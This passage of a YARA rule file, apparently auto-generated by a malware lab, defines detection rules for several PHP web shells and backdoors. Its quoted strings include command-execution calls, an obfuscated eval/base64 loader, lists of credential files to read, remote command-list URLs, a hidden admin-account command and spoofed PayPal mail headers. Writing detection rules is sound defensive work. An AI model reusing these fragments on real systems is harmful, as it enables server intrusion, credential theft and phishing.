      $s19 = "$this->out(\"<table width=100%><tr><!-- <td><a id='sqlconnectbox' href='javascript:;' onclick='itemShowHide(\\\"sqlconnectbox_di" ascii /* score: '24.00'*/
      $s20 = "$this->out('<center><b>Execution Console</b></center><form method=\"post\" action=\"' . $this->make_link(\"exec\", NULL, NULL, T" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_kscr_a__1b8ff30fbeb9 {
   meta:
      description = "php__loose__php - file backdoor_php_kscr_a__1b8ff30fbeb9"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "1b8ff30fbeb9c2dee26d9c11ecc82f0026daae7897db9cc19d37e905adcde9c6"
   strings:
      $s1 = "<div><input type=\"submit\" value=\"Execute Command\" />&nbsp;<input type=\"submit\" name=\"reset\" value=\"Reset\" /></div>" fullword ascii /* score: '28.00'*/
      $s2 = "$header .= \"Return-Path: <service@paypal.com>\\r\\n\";" fullword ascii /* score: '22.00'*/
      $s3 = "  command_hist[current_line] = document.shell.command.value;" fullword ascii /* score: '21.00'*/
      $s4 = "  document.shell.command.value = command_hist[current_line];" fullword ascii /* score: '21.00'*/
      $s5 = "  document.shell.command.focus();" fullword ascii /* score: '21.00'*/
      $s6 = "echo '<html><head><title>'.$Title.' Uploader</title>';" fullword ascii /* score: '20.00'*/
      $s7 = "if(isset($_GET['Uploader'])){" fullword ascii /* score: '20.00'*/
      $s8 = "$header .= \"Message-Id:<$messid@paypal.com>\\r\\n\";" fullword ascii /* score: '19.00'*/
      $s9 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword ascii /* score: '18.00'*/
      $s10 = "<!-- Mailer -->" fullword ascii /* score: '17.00'*/
      $s11 = "<!-- </Mailer> -->" fullword ascii /* score: '17.00'*/
      $s12 = "$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);" fullword ascii /* score: '17.00'*/
      $s13 = "$GraphicHeader = '<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1257\">" fullword ascii /* score: '17.00'*/
      $s14 = "if(!empty($_SERVER['HTTP_USER_AGENT'])) echo \"<li> <span style=\\\"color: Black;\\\">HTTP_USER_AGENT: </span><b>\".$_SERVER['HT" ascii /* score: '15.00'*/
      $s15 = "if(!empty($_SERVER['HTTP_USER_AGENT'])) echo \"<li> <span style=\\\"color: Black;\\\">HTTP_USER_AGENT: </span><b>\".$_SERVER['HT" ascii /* score: '15.00'*/
      $s16 = "<a href=\"?MainPage\"><img src=\"http://kenshin-lt.net/images/fuck.gif\" width=\"50\" height=\"50\" alt=\"Home\"></a>" fullword ascii /* score: '15.00'*/
      $s17 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)" fullword ascii /* score: '15.00'*/
      $s18 = "<div><a href=\"?Uploader\">FileUploader</a></div>" fullword ascii /* score: '15.00'*/
      $s19 = "If ($file_name) $header .= \"Content-Type: multipart/mixed; boundary=$uid\\r\\n\";" fullword ascii /* score: '14.00'*/
      $s20 = "echo '<html><head><title>'.$Title.' PHPShell</title>';" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule backdoor_php_ironfist__654a810a0252 {
   meta:
      description = "php__loose__php - file backdoor_php_ironfist__654a810a0252"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "654a810a02525a35543346c62b4b3bd599cbeb7e41b505f18ced0763aefbbe3a"
   strings:
      $s1 = "<title>Command Shell ~ <?php print getenv(\"HTTP_HOST\"); ?></title>" fullword ascii /* score: '28.00'*/
      $s2 = "<a href=\"http://www.milw0rm.com\" target=_blank>milw0rm</a>" fullword ascii /* score: '27.00'*/
      $s3 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword ascii /* score: '27.00'*/
      $s4 = "<b style=\"cursor:crosshair\" onclick=\"set_tab('cmd');\">[Execute command]</b> " fullword ascii /* score: '26.00'*/
      $s5 = "//Execute any other command" fullword ascii /* score: '26.00'*/
      $s6 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword ascii /* score: '26.00'*/
      $s7 = "print \"Ajax Command Shell by <a href=http://www.ironwarez.info>Ironfist</a>.<br>Version $version\";" fullword ascii /* score: '25.00'*/
      $s8 = "If one of the command execution functions work, the shell will function fine. " fullword ascii /* score: '25.00'*/
      $s9 = "<b><font size=3>Ajax/PHP Command Shell</b></font><br>by Ironfist" fullword ascii /* score: '22.00'*/
      $s10 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword ascii /* score: '22.00'*/
      $s11 = "print '<b><font size=7>Ajax/PHP Command Shell</b></font>" fullword ascii /* score: '22.00'*/
      $s12 = "print \"<br>Safe mode will prevent some stuff, maybe command execution, if you're looking for a <br>reason why the commands aren" ascii /* score: '22.00'*/
      $s13 = "document.getElementById('output').innerHTML = document.getElementById('output').innerHTML + \"<br><b>Saved! If it didn't save, y" ascii /* score: '22.00'*/
      $s14 = "<form action=\".basename(__FILE__).\" method=POST>You are not logged in, please login.<br><b>Password:</b><input type=password n" ascii /* score: '20.00'*/
      $s15 = "print \"<br>Safe mode will prevent some stuff, maybe command execution, if you're looking for a <br>reason why the commands aren" ascii /* score: '20.00'*/
      $s16 = "<a href=\"http://www.ironwarez.info\" target=_blank>SharePlaza</a>" fullword ascii /* score: '20.00'*/
      $s17 = "function runcommand(urltoopen,action,contenttosend){" fullword ascii /* score: '20.00'*/
      $s18 = "cmdhistory = \"<br>&nbsp;<i style=\\\"cursor:crosshair\\\" onclick=\\\"document.cmdform.command.value='\" + urltoopen + \"'\\\">" ascii /* score: '20.00'*/
      $s19 = "print shell_exec($cmd);" fullword ascii /* score: '20.00'*/
      $s20 = "<form action=\".basename(__FILE__).\" method=POST>You are not logged in, please login.<br><b>Password:</b><input type=password n" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule backdoor_php_encrypted_ru_unknown__e9fd3f625704 {
   meta:
      description = "php__loose__php - file backdoor_php_encrypted_ru_unknown__e9fd3f625704"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "e9fd3f6257049edfd58b0f38b44896bf2d57ef3c3edf69c344b09991ad8e6f73"
   strings:
      $x1 = "@execute(\"$path /tmp/httpd_conf.tmp.php &\");" fullword ascii /* score: '35.00'*/
      $s2 = "eval(gzinflate(base64_decode('HJ3HcqTYFkU/53UEA7wb4n3i7eQFPvHefn2neqiKKAku5+69lhJQeab9P/XbjFWf7uU/WbqVBPb/osynovznf7L6yvnyKmLngz" ascii /* score: '30.00'*/
      $s3 = "'my.cnf','pureftpd.conf','proftpd.conf','ftpd.conf','resolv.conf','login.conf','smb.conf','sysctl.conf','syslog.conf','access.co" ascii /* score: '27.00'*/
      $s4 = "$presets_rlph = array('index.php','.htaccess','.htpasswd','httpd.conf','vhosts.conf','cfg.php','config.php','config.inc.php','co" ascii /* score: '25.00'*/
      $s5 = "$presets_rlph = array('index.php','.htaccess','.htpasswd','httpd.conf','vhosts.conf','cfg.php','config.php','config.inc.php','co" ascii /* score: '25.00'*/
      $s6 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword ascii /* score: '24.00'*/
      $s7 = "'my.cnf','pureftpd.conf','proftpd.conf','ftpd.conf','resolv.conf','login.conf','smb.conf','sysctl.conf','syslog.conf','access.co" ascii /* score: '23.00'*/
      $s8 = "$tempdirs = array(@ini_get('session.save_path').'/',@ini_get('upload_tmp_dir').'/','/tmp/','/dev/shm/','/var/tmp/');" fullword ascii /* score: '21.00'*/
      $s9 = "fwrite($f,file_get_contents($_POST['download_path'])); fclose($f);" fullword ascii /* score: '20.00'*/
      $s10 = "'access','auth','error','backup','data','back','sysconfig','phpbb','phpbb2','vbulletin','vbullet','phpnuke','cgi-bin','html','ro" ascii /* score: '20.00'*/
      $s11 = "nf','accounting.log','home','htdocs'," fullword ascii /* score: '19.00'*/
      $s12 = "$path = execute(\"which php\");" fullword ascii /* score: '18.00'*/
      $s13 = "'shadow','passwd','.bash_history','.mysql_history','master.passwd','user','admin','password','administrator','phpMyAdmin','secur" ascii /* score: '18.00'*/
      $s14 = "function execute($cfe)" fullword ascii /* score: '18.00'*/
      $s15 = "elseif(@function_exists('passthru')) { @ob_start(); @passthru($cfe); $res = @ob_get_contents(); @ob_end_clean(); }" fullword ascii /* score: '17.00'*/
      $s16 = "@$f=fopen('/tmp/httpd_conf.tmp.php','w');" fullword ascii /* score: '17.00'*/
      $s17 = "elseif(@function_exists('system')) { @ob_start(); @system($cfe); $res = @ob_get_contents(); @ob_end_clean(); }" fullword ascii /* score: '17.00'*/
      $s18 = "7KQs58uRJ5l4zvU+A0kkmSAwqTTQr9YbJiFcDUk59vAF1Jbt7AAlIIRc8LUsAX8YRD/eNIElLB4pK6wg1a6DBN4RdLoafIKl7T8I18tEWSZRGIprpV9IHIAefrRO8Qs/" ascii /* score: '16.00'*/
      $s19 = "HPfRi9tm8YFXevOOWnJNqQYZ+RB2iKMdfBEYeDxVHGermj6ItCUvrulDg43y8bYoqrdrQ2YVVwGq3ZLXW8RoZo1bYSflyabsXgV914wA0k2XbHwFMVg4F1ZK95RSiXFL" ascii /* score: '16.00'*/
      $s20 = "FsGkUVMLfjB/zBehyBrjE0Tfy0l/PQAumbnR2GIhLCRyBAofwVb/aTZyhkudAAGFUKePj5Joab4Beemwb5U1KgoHSPYi9+ohs2Wnis2fOi8v2AOx2akHXkVMDYgyxle7" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_bypass_a__0be0f7808648 {
   meta:
      description = "php__loose__php - file backdoor_php_bypass_a__0be0f7808648"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "0be0f7808648726c33b90635689cf4552955836c2ea36c8d35d845e31873cff4"
   strings:
      $x1 = "<!-- HTML Encryption provided by iWEBTOOL.com -->" fullword ascii /* score: '32.00'*/
      $s2 = "       <td style=\"BORDER-TOP: silver 1px solid;\" width=350 NOWRAP><span class=\"style5\"> Safe0ver Shell Piyasada Bulunan Bir " ascii /* score: '29.00'*/
      $s3 = "---------------------<p>Bypass Kullan?m:<b>Cat /home/evilc0der/public_html/config.php</b> Gibi Olmalidir.<br>" fullword ascii /* score: '29.00'*/
      $s4 = "$scriptident = \"<a href =http://www.WWW.php-shell.org>\".\"$scriptTitle By TDT - www.WWW.php-shell.org</a>\";" fullword ascii /* score: '26.00'*/
      $s5 = "                 echo sp(3).buildUrl( $img[\"Execute\"], \"cmd=execute&file=$dir/$file\").\"\\n\";" fullword ascii /* score: '25.00'*/
      $s6 = "<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->" fullword ascii /* score: '23.00'*/
      $s7 = "$safemodgec = shell_exec($evilc0der);" fullword ascii /* score: '22.00'*/
      $s8 = "*                                       ByPass PHP SHELL                                      *" fullword ascii /* score: '22.00'*/
      $s9 = "<option value=\"cat /var/cpanel/accounting.log\">cat /var/cpanel/accounting.log</option>" fullword ascii /* score: '19.00'*/
      $s10 = " <meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"></HEAD>" fullword ascii /* score: '17.00'*/
      $s11 = "  elseif ( $cmd==\"execute\" ) {" fullword ascii /* score: '17.00'*/
      $s12 = "                \"Execute\"     => \"exec.gif\"" fullword ascii /* score: '16.00'*/
      $s13 = "        header(\"Content-Disposition: attachment; filename=$downloadto$add\");" fullword ascii /* score: '15.00'*/
      $s14 = "Shell'in Kodlarindan(c99,r57 vs...) Sentezlenerek Kodlanmistir.Entegre Olarak Bypass ?zelligi Eklenmis Ve B?ylece Tahrip G?c? Y?" ascii /* score: '15.00'*/
      $s15 = "WWW.php-shell.org" fullword ascii /* score: '15.00'*/
      $s16 = "    <br><p><br>Safe Mode ByPAss<p><form method=\"POST\">" fullword ascii /* score: '15.00'*/
      $s17 = "$evilc0der=$_POST['dizin'];" fullword ascii /* score: '14.00'*/
      $s18 = "    if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset($PHP_AUTH_USER) || $PHP_AUTH_USER != $http_auth_" ascii /* score: '13.00'*/
      $s19 = "user || $PHP_AUTH_PW != $http_auth_pass)  ||  (($logoff==1) && $noauth==\"yes\")  )   { " fullword ascii /* score: '13.00'*/
      $s20 = "$scriptver = \"TDT Version\";" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_xigor_a__2723d9e670c1 {
   meta:
      description = "php__loose__php - file backdoor_php_xigor_a__2723d9e670c1"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "2723d9e670c12f46218bfd70b532fbd956a3868a7f8ff7aeab2fcb8e3e01b9a4"
   strings:
      $s1 = " $mhost = 'http://legiaourbana.itafree.com/cmd/list.txt?';" fullword ascii /* score: '24.00'*/
      $s2 = "echo \"<!--webbot bot=\\\"FileUpload\\\" u-file=\\\"_private/form_results.csv\\\" s-format=\\\"TEXT/CSV\\\" s-label-fields=\\\"T" ascii /* score: '21.00'*/
      $s3 = "echo \"<!--webbot bot=\\\"FileUpload\\\" u-file=\\\"_private/form_results.csv\\\" s-format=\\\"TEXT/CSV\\\" s-label-fields=\\\"T" ascii /* score: '21.00'*/
      $s4 = "$CMD[1] = shell_exec($CMDs);" fullword ascii /* score: '20.00'*/
      $s5 = " echo \"<!--webbot bot=\\\"SaveResults\\\" u-file=\\\"_private/form_results.csv\\\" s-format=\\\"TEXT/CSV\\\" s-label-fields=" ascii /* score: '19.00'*/
      $s6 = " echo \"<!--webbot bot=\\\"SaveResults\\\" u-file=\\\"_private/form_results.csv\\\" s-format=\\\"TEXT/CSV\\\" s-label-fields=" ascii /* score: '19.00'*/
      $s7 = " $bt = 'http://www.full-comandos.com/jobing/r0nin';" fullword ascii /* score: '17.00'*/
      $s8 = " $dc = 'http://www.full-comandos.com/jobing/dc.txt';" fullword ascii /* score: '17.00'*/
      $s9 = "$msg .= \"<p style=\\\"color: #FF0000;text-align: center;font-family: 'Lucida Console';font-size: 12px;margin 2\\\">Erro ao exec" ascii /* score: '17.00'*/
      $s10 = "exec($CMDs, $CMD[1]);" fullword ascii /* score: '17.00'*/
      $s11 = "r}&amp;cmd={$newuser}\\\">[Remote Access]</a></legend>\";" fullword ascii /* score: '15.00'*/
      $s12 = "et localgroup &quot;Users&quot; /del Admin';" fullword ascii /* score: '15.00'*/
      $s13 = "r={$chdir}&amp;cmd=$newuser\\\">[Remote Access]</a></legend>\";" fullword ascii /* score: '15.00'*/
      $s14 = "  echo \"<legend>Dir&nbsp;<b>YES</b>:&nbsp;{$chdir}&nbsp;-&nbsp;<a href=\\\"#[New Dir]\\\" onclick=\\\"Mkdir('{$chdir}');\\\">[N" ascii /* score: '15.00'*/
      $s15 = " $newuser = '@echo off;net user Admin /add /expires:never /passwordreq:no;net localgroup &quot;Administrators&quot; /add Admin;n" ascii /* score: '15.00'*/
      $s16 = "  echo \"<legend>Dir&nbsp;NO:&nbsp;{$chdir}&nbsp;-&nbsp;<a href=\\\"#[New Dir]\\\" onclick=\\\"Mkdir('{$chdir}');\\\">[New Dir]<" ascii /* score: '15.00'*/
      $s17 = " $newuser = '@echo off;net user Admin /add /expires:never /passwordreq:no;net localgroup &quot;Administrators&quot; /add Admin;n" ascii /* score: '15.00'*/
      $s18 = "$CMD[1][] .= fgets($handle);" fullword ascii /* score: '14.00'*/
      $s19 = "$msg .= \"<p style=\\\"color: #FF0000;text-align: center;font-family: 'Lucida Console';font-size: 12px;margin 2\\\">Erro ao exec" ascii /* score: '14.00'*/
      $s20 = " if (!empty($_POST['cmd'])) { $cmdget = @$_POST['cmd']; }" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 60KB and
      8 of them
}

rule backdoor_php_charlichaplin_a__f50e9b35df9c {
   meta:
      description = "php__loose__php - file backdoor_php_charlichaplin_a__f50e9b35df9c"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "f50e9b35df9cfbfdb052a0fa128bdb61b0a46c215ac74232643db0f6a43b07f2"
   strings:
      $s1 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?shell=id\\\">Executer un shell</a> \";" fullword ascii /* score: '21.00'*/
      $s2 = "echo \"<center><b>Coded By Charlichaplin</b></center>\";" fullword ascii /* score: '16.00'*/
      $s3 = "   Coded By Charlichaplin" fullword ascii /* score: '13.00'*/
      $s4 = "$backdoor->shell = $shell;" fullword ascii /* score: '13.00'*/
      $s5 = "   charlichaplin@gmail.com" fullword ascii /* score: '13.00'*/
      $s6 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy=http://www.cnil.fr/index.php?id=123\\\">Utiliser le serveur comme proxy</a> " ascii /* score: '13.00'*/
      $s7 = "$host2 = explode(\"/\",$proxy);" fullword ascii /* score: '12.00'*/
      $s8 = "$backdoor->proxy = $proxy;" fullword ascii /* score: '11.00'*/
      $s9 = "   $backdoor->proxy($host,$page);" fullword ascii /* score: '11.00'*/
      $s10 = "         echo \"[DIR]<A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".$rep.$value.\"\\\">\".$value.\"/</A>                  \".date" ascii /* score: '11.00'*/
      $s11 = "$pwd = $_SERVER['SCRIPT_FILENAME'];" fullword ascii /* score: '10.00'*/
      $s12 = " name=\\\"Shell\\\"></form><br>\";" fullword ascii /* score: '9.00'*/
      $s13 = "$cdestination = $_POST['cdestination'];" fullword ascii /* score: '9.00'*/
      $s14 = "      echo \"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"\\\"><input name=\\\"shell\\\" type=\\\"text\\\"><in" ascii /* score: '9.00'*/
      $s15 = "$host = $host2[2];" fullword ascii /* score: '9.00'*/
      $s16 = "      echo \"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"\\\"><input name=\\\"shell\\\" type=\\\"text\\\"><in" ascii /* score: '9.00'*/
      $s17 = "$shell = $_REQUEST['shell'];" fullword ascii /* score: '9.00'*/
      $s18 = "$fichier = $_POST['fichier'];" fullword ascii /* score: '9.00'*/
      $s19 = "$n = count($host2);" fullword ascii /* score: '9.00'*/
      $s20 = "         $header .= \"Host: \".$host.\"\\r\\n\";" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule backdoor_php_peterson__292f097492d6 {
   meta:
      description = "php__loose__php - file backdoor_php_peterson__292f097492d6"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "292f097492d6c710d207d22eab3aaa9b89897a84bade1d85dfb9a83aa85282a5"
   strings:
      $s1 = " $mhost = 'http://nodan.110mb.com/cmds.txt?';" fullword ascii /* score: '22.00'*/
      $s2 = "  $to = (\"arms27@fdfrr.com\");" fullword ascii /* score: '18.00'*/
      $s3 = "  exec($CMDs, $CMD[1]);" fullword ascii /* score: '17.00'*/
      $s4 = "<center><h2> --== by MS flood_  ==-- </h2></center>" fullword ascii /* score: '17.00'*/
      $s5 = " $newuser = '@echo off;net user Admin /add /expires:never /passwordreq:no;net localgroup " fullword ascii /* score: '15.00'*/
      $s6 = "href=\\\"{$fstring}&amp;action=cmd&amp;chdir={$chdir}&amp;cmd={$newuser}\\\">Remote " fullword ascii /* score: '15.00'*/
      $s7 = "   $CMD[1] = shell_exec($CMDs);" fullword ascii /* score: '15.00'*/
      $s8 = "&quot;Administrators&quot; /add Admin;net localgroup &quot;Users&quot; /del Admin';" fullword ascii /* score: '15.00'*/
      $s9 = "href=\\\"{$fstring}&amp;action=cmd&amp;chdir={$chdir}&amp;cmd=$newuser\\\">Remote " fullword ascii /* score: '15.00'*/
      $s10 = " if (!empty($_POST['cmd'])) { $cmdget = @$_POST['cmd']; }" fullword ascii /* score: '14.00'*/
      $s11 = "elseif (@$_GET['action'] == 'cmd') {" fullword ascii /* score: '14.00'*/
      $s12 = " if (!empty($_GET['cmd'])) { $cmdget = @$_GET['cmd']; }" fullword ascii /* score: '14.00'*/
      $s13 = " $conteudo = @file_get_contents($filename);" fullword ascii /* score: '14.00'*/
      $s14 = "  If ($file_name) $header .= \"Content-Type: multipart/mixed; boundary=$uid\\r\\n\";" fullword ascii /* score: '14.00'*/
      $s15 = "  $header .= \"Content-Type: text/$contenttype\\r\\n\";" fullword ascii /* score: '14.00'*/
      $s16 = "echo \"<form method=\\\"POST\\\" name=\\\"cmd\\\" " fullword ascii /* score: '14.00'*/
      $s17 = " if (!empty($_GET['cmd'])) { $cmd = @$_GET['cmd']; }" fullword ascii /* score: '14.00'*/
      $s18 = "  If ($file_name) $header .= \"Content-Transfer-Encoding: base64\\r\\n\";" fullword ascii /* score: '14.00'*/
      $s19 = "  If ($file_name) $header .= \"$content\\r\\n\";" fullword ascii /* score: '14.00'*/
      $s20 = "  If ($file_name) $header .= \"Content-Type: $file_type; name=\\\"$file_name\\\"\\r\\n\";" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 60KB and
      8 of them
}

rule backdoor_php_stnc_a__03ba83d27031 {
   meta:
      description = "php__loose__php - file backdoor_php_stnc_a__03ba83d27031"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "03ba83d27031569b87667cb662673bba8d24665ab54e403bb39aac33708d7c49"
   strings:
      $x1 = "<tr><td $hsplit><table><tr><td $vsplit><b>&nbsp;&nbsp;STNC&nbsp;WebShell&nbsp;v$version&nbsp;&nbsp;</b></td><td>id: \".id().\"<b" ascii /* score: '33.00'*/
      $s2 = "uname: \".uname().\"<br>your ip: \".$_SERVER[\"REMOTE_ADDR\"].\" - server ip: \".gethostbyname($_SERVER[\"HTTP_HOST\"]).\" - saf" ascii /* score: '28.00'*/
      $s3 = "<tr><td align=right>Coded by drmist | <a href=\\\"http://drmist.ru\\\">http://drmist.ru</a> | <a href=\\\"http://www.security-te" ascii /* score: '22.00'*/
      $s4 = "<tr><form method=post><td class=\\\"pad\\\" $hsplit><center>\".hidden(\"action\",\"cmd\").\"<table><tr><td width=80>Command:&nbs" ascii /* score: '22.00'*/
      $s5 = "<tr><td align=right>Coded by drmist | <a href=\\\"http://drmist.ru\\\">http://drmist.ru</a> | <a href=\\\"http://www.security-te" ascii /* score: '19.00'*/
      $s6 = "elseif(fe(\"passthru\")){ob_start();passthru($s);$r=ob_get_contents();ob_end_clean();}" fullword ascii /* score: '17.00'*/
      $s7 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean();}" fullword ascii /* score: '17.00'*/
      $s8 = ">\".edit(85,\"cmd\",\"\").\"</td></tr><tr><td>Location:&nbsp;</td><td>\".edit(85,\"pwd\",$location).\"&nbsp;\".button(\"Execute" ascii /* score: '17.00'*/
      $s9 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pwd); else $printline = \"\\\"$pwd\\\" - no such d" ascii /* score: '17.00'*/
      $s10 = "</style><title>  STNC WebShell v$version  </title></head><body><table width=100%>" fullword ascii /* score: '17.00'*/
      $s11 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pwd); else $printline = \"\\\"$pwd\\\" - no such d" ascii /* score: '17.00'*/
      $s12 = "    $printline = \"\\\"$fname\\\" - download failed.\";" fullword ascii /* score: '16.00'*/
      $s13 = "$login='root';" fullword ascii /* score: '15.00'*/
      $s14 = "if(($action === \"download\")&&(isset($_POST[\"fname\"])))" fullword ascii /* score: '15.00'*/
      $s15 = "if(!(($_SERVER[\"PHP_AUTH_USER\"]===$login)&&(sha1($_SERVER[\"PHP_AUTH_PW\"])===$hash)))" fullword ascii /* score: '15.00'*/
      $s16 = "header(\"HTTP/1.0 401 Unauthorized\");" fullword ascii /* score: '15.00'*/
      $s17 = "  if(isset($_POST[\"cmd\"]))" fullword ascii /* score: '14.00'*/
      $s18 = "if(version_compare(phpversion(),\"4.1.0\") == -1)" fullword ascii /* score: '14.00'*/
      $s19 = "elseif(fe(\"shell_exec\"))$r=shell_exec($s);" fullword ascii /* score: '14.00'*/
      $s20 = "{return str100(cmd(\"uname -a\"));}" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule trojan_mailfinder_php_massma_u__b2c0f5e7241d {
   meta:
      description = "php__loose__php - file trojan_mailfinder_php_massma_u__b2c0f5e7241d"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "b2c0f5e7241df28a643d154c2d305d73efda4c5c23b6cd4490b44585e4bb8419"
   strings:
      $s1 = "If ($file_name) $header .= \"$content\\r\\n\"; " fullword ascii /* score: '14.00'*/
      $s2 = "If ($file_name) $header .= \"Content-Type: $file_type; name=\\\"$file_name\\\"\\r\\n\"; " fullword ascii /* score: '14.00'*/
      $s3 = "$header .= \"Content-Type: text/$contenttype\\r\\n\"; " fullword ascii /* score: '14.00'*/
      $s4 = "If ($file_name) $header .= \"Content-Type: multipart/mixed; boundary=$uid\\r\\n\"; " fullword ascii /* score: '14.00'*/
      $s5 = "$header .= \"Content-Transfer-Encoding: 8bit\\r\\n\\r\\n\"; " fullword ascii /* score: '14.00'*/
      $s6 = "If ($file_name) $header .= \"Content-Disposition: attachment; filename=\\\"$file_name\\\"\\r\\n\\r\\n\"; " fullword ascii /* score: '14.00'*/
      $s7 = "If ($file_name) $header .= \"Content-Transfer-Encoding: base64\\r\\n\"; " fullword ascii /* score: '14.00'*/
      $s8 = "$mypassword = \"\";" fullword ascii /* score: '12.00'*/
      $s9 = "$header .= \"MIME-Version: 1.0\\r\\n\"; " fullword ascii /* score: '12.00'*/
      $s10 = "$content = fread(fopen($file,\"r\"),filesize($file)); " fullword ascii /* score: '12.00'*/
      $s11 = "P_AUTH_PW\"] != $mypassword) {" fullword ascii /* score: '12.00'*/
      $s12 = "if ($_SERVER[\"PHP_AUTH_USER\"] == \"\" || $_SERVER[\"PHP_AUTH_PW\"] == \"\" || $_SERVER[\"PHP_AUTH_USER\"] != $myusername || $_" ascii /* score: '12.00'*/
      $s13 = "    header(\"HTTP/1.0 401 Unauthorized\");" fullword ascii /* score: '10.00'*/
      $s14 = "<form name=\"form1\" method=\"post\" action=\"\" enctype=\"multipart/form-data\"> " fullword ascii /* score: '9.00'*/
      $s15 = "<input type=\"radio\" name=\"contenttype\" value=\"plain\"> " fullword ascii /* score: '9.00'*/
      $s16 = "If ($file_name) $header .= \"--$uid\\r\\n\"; " fullword ascii /* score: '9.00'*/
      $s17 = "<input name=\"contenttype\" type=\"radio\" value=\"html\" checked=\"checked\"> " fullword ascii /* score: '9.00'*/
      $s18 = "$header .= \"$message\\r\\n\"; " fullword ascii /* score: '9.00'*/
      $s19 = "$content = chunk_split(base64_encode($content)); " fullword ascii /* score: '9.00'*/
      $s20 = "If ($file_name) $header .= \"--$uid--\"; " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule backdoor_php_dive__fac5f1968c7b {
   meta:
      description = "php__loose__php - file backdoor_php_dive__fac5f1968c7b"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "fac5f1968c7bb59e35ce79699670236c68a32a3864bcdd8fc64fc838a7ad32c2"
   strings:
      $s1 = "  document.shell.command.focus();" fullword ascii /* score: '21.00'*/
      $s2 = "  <title>Dive Shell - Emperor Hacking Team</title>" fullword ascii /* score: '20.00'*/
      $s3 = "      document.shell.command.value = command_hist[current_line];" fullword ascii /* score: '16.00'*/
      $s4 = "      command_hist[current_line] = document.shell.command.value;" fullword ascii /* score: '16.00'*/
      $s5 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST\" style=\"border: 1px solid #808080\">" fullword ascii /* score: '14.00'*/
      $s6 = "  document.shell.output.scrollTop = document.shell.output.scrollHeight;" fullword ascii /* score: '13.00'*/
      $s7 = "    if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword ascii /* score: '13.00'*/
      $s8 = "  document.shell.setAttribute(\"autocomplete\", \"off\");" fullword ascii /* score: '12.00'*/
      $s9 = "  var command_hist = new Array(<?php echo $js_command_hist ?>);" fullword ascii /* score: '12.00'*/
      $s10 = "$padding = str_repeat(\"\\n\", max(0, $_REQUEST['rows']+1 - $lines));" fullword ascii /* score: '12.00'*/
      $s11 = "  if (!empty($_REQUEST['command'])) {" fullword ascii /* score: '12.00'*/
      $s12 = "  <font face=\"Tahoma\" size=\"2\" color=\"#808080\">iM4n - FarHad - imm02tal - R$P</font><font color=\"#808080\"><br>" fullword ascii /* score: '12.00'*/
      $s13 = "  <link rel=\"stylesheet\" href=\"Simshell.css\" type=\"text/css\" />" fullword ascii /* score: '12.00'*/
      $s14 = "    $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . \"\\n\";" fullword ascii /* score: '10.00'*/
      $s15 = "    array_unshift($_SESSION['history'], $_REQUEST['command']);" fullword ascii /* score: '10.00'*/
